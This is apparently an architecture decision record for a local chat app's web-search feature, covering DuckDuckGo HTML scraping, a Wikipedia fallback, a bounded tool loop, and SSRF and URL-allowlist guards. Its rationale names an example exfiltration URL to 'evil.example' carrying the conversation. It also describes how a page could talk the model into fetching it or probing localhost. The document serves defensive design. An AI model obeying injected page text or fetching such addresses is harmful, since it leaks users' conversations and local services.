# 0009: Web search is two tools over DuckDuckGo's HTML page, run by Omni's own loop

Date: 2026-10-29. Status: accepted. Spec: `superpowers/specs/2026-10-29-web-search-design.md`.

## Decision

The chat model gets `web_search` and `read_page` when the person switches web search on. `internal/websearch` searches with a POST to
`html.duckduckgo.com/html/` and reads pages with a plain HTTP client that cannot reach local or private addresses. The loop lives in
`internal/chat`, over the same `/v1/chat/completions` API (structured `tool_calls`, ADR 0008).

## Why

- **Search is not enough, so there are two tools.** A snippet is a sentence; most questions that need the web need the page. A
  small model also does better with "search, then read the best result" than with a long dump of results.
- **DuckDuckGo HTML, not an API.** Measured on this machine (2026-10-29): the POST returned 10 results with real URLs and no key. Its
  `lite` page answered 202 with a challenge. Key-based APIs (Brave, Tavily, Bing) are more stable but need an account and a key
  in Credential Manager before the feature works at all. The price is that the page is scraped: the parser is small and tested
  on a saved copy of the page, and `Search` returns a clear error when the page has no results or asks for a captcha.
  When it asks for a check (after a burst of searches; seen while testing) the search goes to Wikipedia's API, which is official and
  keyless. Bing's HTML was tried as the fallback and rejected: an anonymous request got unrelated results (hotels, for a Go query).
  The way out for good is a key-based provider; the chat package only sees `Search` and `Read`.
- **A parser, not regular expressions, for pages.** `golang.org/x/net/html` (the Go project's own module) tokenises arbitrary HTML
  without being fooled by a `<` inside a script; stripping tags by regexp is the classic way to get this wrong. It is the only
  new dependency.
- **The loop is ours.** Four rounds, results cut to the room left in the context, the last round without tools. The model never
  decides how long it runs.
- **SSRF guard on the connection.** A model that can be talked into fetching `http://127.0.0.1:<port>` could probe the machine
  (the chat model's own server, the search engine's, anything on localhost). The check is on the address actually dialled, after DNS
  and on every redirect, not on the text of the URL.

- **`read_page` opens only what was offered.** The local-address guard does not stop a fetch of `https://evil.example/?d=<conversation>`,
  which a page could talk the model into. So an address must be one the answer's searches returned or the person wrote. The model's
  search words can still carry text to DuckDuckGo or Wikipedia; that is the feature's price and is in the README.

## Alternatives not taken

A hosted "search the web" API behind the model (not local); SearXNG public instances (unreliable, rate-limited, and each is a stranger
who sees the query); opening the person's browser and reading it back (invasive and fragile); letting the model fetch with no guard.

## Consequences

- Web search is a network feature: the README privacy table lists it. It sends the search words (not the conversation) to
  DuckDuckGo, and the page requests go to the sites the model chose.
- The DuckDuckGo page can change or block; the symptom is a tool error shown in the window, and the fix is local to `internal/websearch`.
